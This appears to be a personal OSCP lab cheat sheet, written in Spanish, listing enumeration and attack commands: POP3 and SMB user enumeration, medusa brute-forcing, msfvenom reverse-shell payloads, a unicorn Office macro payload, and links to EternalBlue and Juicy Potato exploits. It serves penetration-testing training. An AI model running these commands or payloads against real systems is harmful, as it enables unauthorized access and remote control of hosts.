# Another-OSCP-Cheatsheet
Os introduzco aquí la cheatsheet personal que he ido usando durante mi recorrido por los labs del OSCP:

## POP3 enum
Este script de bash nos permite enumerar un servicio POP3 para tratar de encontrar algún correo en alguno de los usuarios que hemos encontrado en la etapa de reconocimiento:

    for user in <user1> <user2> <user3>.. <userX>; do
    ( echo USER ${user}; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC <ip> <port>;  done
## SMB enum
**SHARES**
Analiza que shares de SMB están disponibles con un usuario invitado:

    nmap <ip> --script=smb-enum-shares
**SMB USER/CHECK**
Comprueba esa gigante wordlist de usuarios que has ido reuniendo durante la etapa de reconocimiento, fácil y sencillo:

    medusa -M smbnt -h <ip> -U userfile -P passfile -m GROUP:DOMAIN -v 4	
## MSFVenom Payloads
**Windows Payload**  
Intercambia el x64 por x86 si estás en una máquina de 32 bits:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT> -f <format; example: jsp, php..> > file.<format>
    
**Linux Payload**  
Intercambia el x64 por x86 si estás en una máquina de 32 bits:

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<PORT> -f <format; example: jsp, php..> > file.<format>

## Kernel Cross-Compiling

Especialmente útil si estás enfrentando una caja old-school que aún tiene un SO de 32 bits (créeme, hay muchiiiisimas cajas así en los labs del OSCP xd)  
Utiliza la opción --static sabiamente https://stackoverflow.com/questions/8692128/static-option-for-gcc

    gcc ¿--static? -m32 -Wl, --hash-style=both <nombre.c> -o <output>			
## MACRO PAYLOAD
**UNICORN** es una herramienta FANTÁSTICA que debes usar en tu trayecto por los labs del OSCP, si debes crear cualquier macro para una suite office, este software te va a facilitar la vida enormemente https://github.com/trustedsec/unicorn

    python unicorn.py windows/x64/shell_reverse_tcp 11.1.1.151234 macro
    
## Common Exploits
**MS17-010** Si te enfrentas a EternalBlue :) https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/  
**Juicy Potato** Si cuentas con un usuario y al hacer "whoami /priv" cuenta con privilegios SeImpersonate o SeAssignPrimaryToken... https://github.com/ohpe/juicy-potato

## Exploit search

    searchsploit <service name>
    
## Windows Privesc Checklist

https://guif.re/windowseop
https://www.fuzzysecurity.com/tutorials/16.html
    
